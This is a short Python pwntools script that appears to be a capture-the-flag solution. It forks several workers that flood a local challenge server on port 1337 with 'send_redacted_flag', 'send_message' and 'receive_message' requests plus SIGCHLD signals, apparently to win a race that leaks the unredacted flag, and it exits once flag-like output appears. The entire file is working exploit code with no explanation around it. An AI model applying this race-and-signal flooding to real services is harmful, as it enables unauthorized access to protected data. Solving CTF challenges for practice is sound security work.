#!/bin/python

from pwn import *
from os  import *
import time
import signal

context.log_level = 'info'

STR = "REDACTED: "

argv = ['nice', '-n19', sys.argv[1]]
if len(sys.argv) > 2:
    argv.insert(0, 'strace')
    argv.insert(0, 'sudo')

pids = []
server = process(argv)
patern = cyclic(16)

def get_remote():
    return remote("localhost", 1337)


def send_message(proc, msg: bytes):
    proc.sendline(b"send_message\n" + msg)


def send_redacted_flag(proc):
    proc.sendline(b"send_redacted_flag")


def test(proc1): 
    proc2 = get_remote()
    while True:
        send_redacted_flag(proc1)
        send_message(proc2, patern)


def send_signals(proc):
    kill(server.pid, signal.SIGCHLD)


def recv_msgs(proc):
    proc.sendline(b"receive_message")
    try:
        out = proc.recv(timeout=1)
        if out != '' and b"e{" in out:
            print(out)
            exit(0)

    except Exception as ex:
        print(ex)


def make_workers(num: int, fn, *args):
    for i in range(num):
        pid = fork()
        if not pid:
            proc = get_remote()
            while True:
                fn(proc, *args)
        pids.append(pid)


make_workers(3, recv_msgs)
make_workers(1, send_redacted_flag)
make_workers(1, send_signals)
make_workers(1, send_message, patern)

for _ in pids:
    wait()


print("EXIT")
exit(0)
